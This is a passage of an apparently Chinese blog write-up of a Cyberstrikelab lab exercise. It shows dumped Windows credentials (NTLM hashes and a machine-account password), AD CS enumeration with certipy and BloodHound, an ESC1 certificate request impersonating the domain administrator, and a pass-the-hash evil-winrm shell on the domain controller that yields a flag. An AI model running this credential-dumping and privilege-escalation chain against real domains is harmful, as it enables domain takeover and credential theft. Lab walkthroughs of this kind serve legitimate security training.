S-1-5-20\n        msv :\n         [00000003] Primary\n         * Username : CYBERWEB$\n         * Domain   : CYBERSTRIKELAB\n         * NTLM     : 331dcbb88d1a4847c97eab7c1c168ac8\n         * SHA1     : 0a4c17b8f051223716e86c36f1dec902e266c773\n        tspkg :\n        wdigest :\n         * Username : CYBERWEB$\n         * Domain   : CYBERSTRIKELAB\n         * Password : (null)\n        kerberos :\n         * Username : cyberweb$\n         * Domain   : CYBERSTRIKELAB.COM\n         * Password : (null)\n        ssp :\n        credman :\n\nAuthentication Id : 0 ; 23223 (00000000:00005ab7)\nSession           : UndefinedLogonType from 0\nUser Name         : (null)\nDomain            : (null)\nLogon Server      : (null)\nLogon Time        : 2025/5/22 5:12:18\nSID               :\n        msv :\n         [00000003] Primary\n         * Username : CYBERWEB$\n         * Domain   : CYBERSTRIKELAB\n         * NTLM     : 331dcbb88d1a4847c97eab7c1c168ac8\n         * SHA1     : 0a4c17b8f051223716e86c36f1dec902e266c773\n        tspkg :\n        wdigest :\n        kerberos :\n        ssp :\n        credman :\n\nAuthentication Id : 0 ; 1769613 (00000000:001b008d)\nSession           : Interactive from 3\nUser Name         : DWM-3\nDomain            : Window Manager\nLogon Server      : (null)\nLogon Time        : 2025/5/22 14:14:10\nSID               : S-1-5-90-0-3\n        msv :\n         [00000003] Primary\n         * Username : CYBERWEB$\n         * Domain   : CYBERSTRIKELAB\n         * NTLM     : 331dcbb88d1a4847c97eab7c1c168ac8\n         * SHA1     : 0a4c17b8f051223716e86c36f1dec902e266c773\n        tspkg :\n        wdigest :\n         * Username : CYBERWEB$\n         * Domain   : CYBERSTRIKELAB\n         * Password : (null)\n        kerberos :\n         * Username : CYBERWEB$\n         * Domain   : cyberstrikelab.com\n         * Password : I@w2(l8:<span class=\"hljs-variable\">$e9</span>`bRA7&#x26;<span class=\"hljs-variable\">$Rxd</span>^f@6+_,hg\\L)&#x26;Ck6he8vlsS7*=[e*%bh-wZ.,<span class=\"hljs-variable\">$HV</span>(0^!/q0eY=sDH_1)6jK3v;#%kt[5YSXt3<span class=\"hljs-variable\">$y</span>/;R(wAqp1p_`\"</span><span class=\"hljs-string\">\"m=o:Q;HtsY\n        ssp :\n        credman :\n\nAuthentication Id : 0 ; 315377 (00000000:0004cff1)\nSession           : Interactive from 0\nUser Name         : cslab\nDomain            : CYBERSTRIKELAB\nLogon Server      : DC\nLogon Time        : 2025/5/22 13:16:25\nSID               : S-1-5-21-4286488488-1212600890-1604239976-1104\n        msv :\n         [00000003] Primary\n         * Username : cslab\n         * Domain   : CYBERSTRIKELAB\n         * NTLM     : 39b0e84f13872f51efb3b8ba5018c517\n         * SHA1     : fa6a465532224cc4f1fa5094424bf219d25b7463\n\n         * DPAPI    :\n432dfb0f990f2cc292b2fd09468aab5e\n        tspkg :\n        wdigest :\n         * Username : cslab\n         * Domain   : CYBERSTRIKELAB\n         * Password : (null)\n        kerberos :\n         * Username : cslab\n         * Domain   : CYBERSTRIKELAB.COM\n         * Password : (null)\n        ssp :\n        credman :\n\nAuthentication Id : 0 ; 135581 (00000000:0002119d)\nSession           : Interactive from 1\nUser Name         : Administrator\nDomain            : CYBERWEB\nLogon Server      : CYBERWEB\nLogon Time        : 2025/5/22 5:14:06\nSID               : S-1-5-21-332097019-2215467117-1557799732-500\n        msv :\n         [00000003] Primary\n         * Username : Administrator\n         * Domain   : CYBERWEB\n         * NTLM     : c377ba8a4dd52401bc404dbe49771bbc\n         * SHA1     : d9ac14100bf4e36f6807dd3c29051983b2d58d3d\n        tspkg :\n        wdigest :\n         * Username : Administrator\n         * Domain   : CYBERWEB\n         * Password : (null)\n        kerberos :\n         * Username : Administrator\n         * Domain   : CYBERWEB\n         * Password : (null)\n        ssp :\n        credman :\n\nAuthentication Id : 0 ; 997 (00000000:000003e5)\nSession           : Service from 0\nUser Name         : LOCAL SERVICE\nDomain            : NT AUTHORITY\nLogon Server      : (null)\nLogon Time        : 2025/5/22 5:12:29\nSID               : S-1-5-19\n        msv :\n        tspkg :\n        wdigest :\n         * Username : (null)\n         * Domain   : (null)\n         * Password : (null)\n        kerberos :\n         * Username : (null)\n         * Domain   : (null)\n         * Password : (null)\n        ssp :\n        credman :\n\nAuthentication Id : 0 ; 51191 (00000000:0000c7f7)\nSession           : Interactive from 1\nUser Name         : DWM-1\nDomain            : Window Manager\nLogon Server      : (null)\nLogon Time        : 2025/5/22 5:12:29\nSID               : S-1-5-90-0-1\n        msv :\n         [00000003] Primary\n         * Username : CYBERWEB$\n         * Domain   : CYBERSTRIKELAB\n         * NTLM     : 331dcbb88d1a4847c97eab7c1c168ac8\n         * SHA1     : 0a4c17b8f051223716e86c36f1dec902e266c773\n        tspkg :\n        wdigest :\n         * Username : CYBERWEB$\n         * Domain   : CYBERSTRIKELAB\n         * Password : (null)\n        kerberos :\n         * Username : CYBERWEB$\n         * Domain   : cyberstrikelab.com\n         * Password : I@w2(l8:<span class=\"hljs-variable\">$e9</span>`bRA7&#x26;<span class=\"hljs-variable\">$Rxd</span>^f@6+_,hg\\L)&#x26;Ck6he8vlsS7*=[e*%bh-wZ.,<span class=\"hljs-variable\">$HV</span>(0^!/q0eY=sDH_1)6jK3v;#%kt[5YSXt3<span class=\"hljs-variable\">$y</span>/;R(wAqp1p_`\"</span><span class=\"hljs-string\">\"m=o:Q;HtsY\n        ssp :\n        credman :\n\nAuthentication Id : 0 ; 999 (00000000:000003e7)\nSession           : UndefinedLogonType from 0\nUser Name         : CYBERWEB$\nDomain            : CYBERSTRIKELAB\nLogon Server      : (null)\nLogon Time        : 2025/5/22 5:12:17\nSID               : S-1-5-18\n        msv :\n        tspkg :\n        wdigest :\n         * Username : CYBERWEB$\n         * Domain   : CYBERSTRIKELAB\n         * Password : (null)\n        kerberos :\n         * Username : cyberweb$\n         * Domain   : CYBERSTRIKELAB.COM\n         * Password : (null)\n        ssp :\n        credman :\n</span></code></pre>\n<p>得到机器用户凭据 <code>CYBERWEB$</code> ，NTLM： <code>331dcbb88d1a4847c97eab7c1c168ac8</code> ，Password： <code>I@w2</code></p>\n<pre><code class=\"hljs language-bash\">10.6.6.55       DC.cyberstrikelab.com   cyberstrikelab.com\n10.6.6.77       cyberweb.cyberstrikelab.com \n</code></pre>\n<p>回到<code>Kali</code>，使用 <code>certipy-ad</code> 和 <code>Bloodhound-py</code>(略) 通过机器用户 <code>CYBERWEB$</code> 收集域内信息分析 <code>ADCS</code> 攻击</p>\n<pre><code class=\"hljs language-bash\">➜  Lab-9 proxychains -q certipy-ad find -u CYBERWEB$ -hashes 331dcbb88d1a4847c97eab7c1c168ac8 -dns-tcp -dc-ip 10.6.6.55 -bloodhound -debug   \nCertipy v4.8.2 - by Oliver Lyak (ly4k)\n\n[+] Authenticating to LDAP server\n[+] Bound to ldaps://10.6.6.55:636 - ssl\n[+] Default path: DC=cyberstrikelab,DC=com\n[+] Configuration path: CN=Configuration,DC=cyberstrikelab,DC=com\n[*] Finding certificate templates\n[*] Found 34 certificate templates\n[*] Finding certificate authorities\n[*] Found 1 certificate authority\n[*] Found 12 enabled certificate templates\n[+] Trying to resolve <span class=\"hljs-string\">'DC.cyberstrikelab.com'</span> at <span class=\"hljs-string\">'10.6.6.55'</span>\n[*] Trying to get CA configuration <span class=\"hljs-keyword\">for</span> <span class=\"hljs-string\">'cyberstrikelab-DC-CA'</span> via CSRA\n[+] Trying to get DCOM connection <span class=\"hljs-keyword\">for</span>: 10.6.6.55\n[!] Got error <span class=\"hljs-keyword\">while</span> trying to get CA configuration <span class=\"hljs-keyword\">for</span> <span class=\"hljs-string\">'cyberstrikelab-DC-CA'</span> via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.\n[*] Trying to get CA configuration <span class=\"hljs-keyword\">for</span> <span class=\"hljs-string\">'cyberstrikelab-DC-CA'</span> via RRP\n[!] Failed to connect to remote registry. Service should be starting now. Trying again...\n[+] Connected to remote registry at <span class=\"hljs-string\">'DC.cyberstrikelab.com'</span> (10.6.6.55)\n[*] Got CA configuration <span class=\"hljs-keyword\">for</span> <span class=\"hljs-string\">'cyberstrikelab-DC-CA'</span>\n[+] Resolved <span class=\"hljs-string\">'DC.cyberstrikelab.com'</span> from cache: 10.6.6.55\n[+] Connecting to 10.6.6.55:80\n[*] Saved BloodHound data to <span class=\"hljs-string\">'20250522025230_Certipy.zip'</span>. Drag and drop the file into the BloodHound GUI from @ly4k\n</code></pre>\n<p>导入到<code>BloodHound</code> 进行分析，这里使用的<code>BloodHound</code>版本是：<a href=\"https://github.com/ly4k/BloodHound/releases/tag/v4.2.0-ly4k\">https://github.com/ly4k/BloodHound/releases/tag/v4.2.0-ly4k</a></p>\n<ol>\n<li>\n<p><code>CA</code> 名称</p>\n<p><img src=\"/post-images/Cyberstrikelablab9/image11.png\" alt=\"image.png\"></p>\n<pre><code class=\"hljs language-bash\">10.6.6.55       DC.cyberstrikelab.com   cyberstrikelab.com   CYBERSTRIKELAB-DC-CA\n10.6.6.77       cyberweb.cyberstrikelab.com \n</code></pre>\n</li>\n<li>\n<p>寻找攻击路径，可以在 <strong>查找配置错误的证书模板</strong> 中找到<code>DC</code>的证书模板</p>\n<p><img src=\"/post-images/Cyberstrikelablab9/image12.png\" alt=\"image.png\"></p>\n</li>\n</ol>\n<h3>ESC 1</h3>\n<p><code>DC</code>证书模板的属性（喂给<code>AI</code>）：</p>\n<table>\n<thead>\n<tr>\n<th>参数</th>\n<th>值</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Any Purpose</td>\n<td>False</td>\n</tr>\n<tr>\n<td>Authorized Signatures Required</td>\n<td>0</td>\n</tr>\n<tr>\n<td>Certificate Authorities</td>\n<td>cyberstrikelab-DC-CA</td>\n</tr>\n<tr>\n<td>Certificate Name Flag</td>\n<td>EnrolleeSuppliesSubject</td>\n</tr>\n<tr>\n<td>Client Authentication</td>\n<td>True</td>\n</tr>\n<tr>\n<td>Enabled</td>\n<td>True</td>\n</tr>\n<tr>\n<td>Enrollee Supplies Subject</td>\n<td>True</td>\n</tr>\n<tr>\n<td>Enrollment Agent</td>\n<td>False</td>\n</tr>\n<tr>\n<td>Enrollment Flag</td>\n<td>None</td>\n</tr>\n<tr>\n<td>Extended Key Usage</td>\n<td>Client Authentication</td>\n</tr>\n<tr>\n<td>Minimum RSA Key Length</td>\n<td>2,048</td>\n</tr>\n<tr>\n<td>Private Key Flag</td>\n<td>16842752</td>\n</tr>\n<tr>\n<td>Renewal Period</td>\n<td>6 weeks</td>\n</tr>\n<tr>\n<td>Requires Key Archival</td>\n<td>False</td>\n</tr>\n<tr>\n<td>Requires Manager Approval</td>\n<td>False</td>\n</tr>\n<tr>\n<td>Validity Period</td>\n<td>1 year</td>\n</tr>\n<tr>\n<td>domain</td>\n<td>CYBERSTRIKELAB.COM</td>\n</tr>\n</tbody>\n</table>\n<p><code>Certificate Name Flag: EnrolleeSuppliesSubject</code> 表明模板启用了 <code>CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT</code> 标志。</p>\n<p><code>Extended Key Usage: Client Authentication</code> 表示证书包含客户端身份验证的EKU（扩展密钥用法），使证书可用于Kerberos认证，进而获取TGT票据。</p>\n<p><code>Requires Manager Approval: False</code>：无需管理员审批，允许直接颁发证书。</p>\n<p><code>Authorized Signatures Required: 0</code>：无需额外签名授权，简化攻击流程</p>\n<p>ESC1 攻击利用：<a href=\"https://www.thehacker.recipes/ad/movement/adcs/certificate-templates#esc1-template-allows-san\">https://www.thehacker.recipes/ad/movement/adcs/certificate-templates#esc1-template-allows-san</a> | <a href=\"https://www.rbtsec.com/blog/active-directory-certificate-services-adcs-esc1/\">https://www.rbtsec.com/blog/active-directory-certificate-services-adcs-esc1/</a></p>\n<pre><code class=\"hljs language-bash\">➜  Lab-9 proxychains -q certipy req \\\n  -u <span class=\"hljs-string\">'CYBERWEB$'</span> \\\n  -hashes 331dcbb88d1a4847c97eab7c1c168ac8 \\\n  -dc-ip 10.6.6.55 \\\n  -target 10.6.6.55 \\\n  -ca <span class=\"hljs-string\">'CYBERSTRIKELAB-DC-CA'</span> \\\n  -template <span class=\"hljs-string\">'DC'</span> \\\n  -upn <span class=\"hljs-string\">'administrator@cyberstrikelab.com'</span> \\\n  -dns-tcp \\\n  -debug\n\nCertipy v4.8.2 - by Oliver Lyak (ly4k)\n\n[+] Generating RSA key\n[*] Requesting certificate via RPC\n[+] Trying to connect to endpoint: ncacn_np:10.6.6.55[\\pipe\\cert]\n[+] Connected to endpoint: ncacn_np:10.6.6.55[\\pipe\\cert]\n[*] Successfully requested certificate\n[*] Request ID is 7\n[*] Got certificate with UPN <span class=\"hljs-string\">'administrator@cyberstrikelab.com'</span>\n[*] Certificate has no object SID\n[*] Saved certificate and private key to <span class=\"hljs-string\">'administrator.pfx'</span>\n</code></pre>\n<pre><code class=\"hljs language-bash\">➜  Lab-9 proxychains -q certipy auth -pfx administrator.pfx -dc-ip 10.6.6.55 -debug\nCertipy v4.8.2 - by Oliver Lyak (ly4k)\n\n[*] Using principal: administrator@cyberstrikelab.com\n[*] Trying to get TGT...\n[*] Got TGT\n[*] Saved credential cache to <span class=\"hljs-string\">'administrator.ccache'</span>\n[*] Trying to retrieve NT <span class=\"hljs-built_in\">hash</span> <span class=\"hljs-keyword\">for</span> <span class=\"hljs-string\">'administrator'</span>\n[*] Got <span class=\"hljs-built_in\">hash</span> <span class=\"hljs-keyword\">for</span> <span class=\"hljs-string\">'administrator@cyberstrikelab.com'</span>: aad3b435b51404eeaad3b435b51404ee:28cfbc91020438f2a064a63fff9871fa\n</code></pre>\n<p><code>flag 3</code></p>\n<pre><code class=\"hljs language-bash\">➜  Lab-9 proxychains evil-winrm -i 10.6.6.55 -u administrator -H 28cfbc91020438f2a064a63fff9871fa\n[proxychains] config file found: /etc/proxychains4.conf\n[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4\n[proxychains] DLL init: proxychains-ng 4.17\n                                        \nEvil-WinRM shell v3.7\n                                        \nWarning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() <span class=\"hljs-keyword\">function</span> is unimplemented on this machine\n                                        \nData: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion\n                                        \nInfo: Establishing connection to remote endpoint\n[proxychains] Strict chain  ...  172.16.233.2:8001  ...  10.6.6.55:5985  ...  OK\n*Evil-WinRM* PS C:\\Users\\Administrator\\Documents> \n</code></pre>\n<pre><code class=\"hljs language-bash\">*Evil-WinRM* PS C:\\> <span class=\"hljs-built_in\">type</span> flag.txt\ngo-flag{1DDE7826-F56B-486D-A661-E9AA83874EFA}\n</code></pre>\n<h2>总结</h2>\n<p>总的来说不难，一把梭哈，但是环境问题太多了。</p>","title":"Cyberstrikelab - lab9","date":"2025-05-22","updated":"2025-05-22","tags":["Cyberstrikelab","Windows靶机","域渗透","ADCS","ESC1","隧道搭建"],"categories":"靶机","comments":true},"recentPosts":[{"title":"HackTheBox - Machine - Bucket","slug":"HackTheBoxMachine - Bucket","date":"2025-06-06","updated":"2025-06-06","isEncrypted":false},{"title":"HackTheBox - Machine - Support","slug":"HackTheBoxMachine -Support","date":"2025-06-05","updated":"2025-06-05","isEncrypted":false},{"title":"HackTheBox - Machine - Hospital","slug":"HackTheBoxMachine - Hospital","date":"2025-06-04","updated":"2025-06-04","isEncrypted":false},{"title":"HackTheBox - Season8 - Certificate","slug":"HackTheBoxSeason8 - Certificate","date":"2025-06-02","updated":"2025-06-02","isEncrypted":true},{"title":"HackTheBox - Machine - Strutted","slug":"HackTheBoxMachine - Strutted","date":"2025-06-02","updated":"2025-06-02","isEncrypted":false}]},"__N_SSG":true}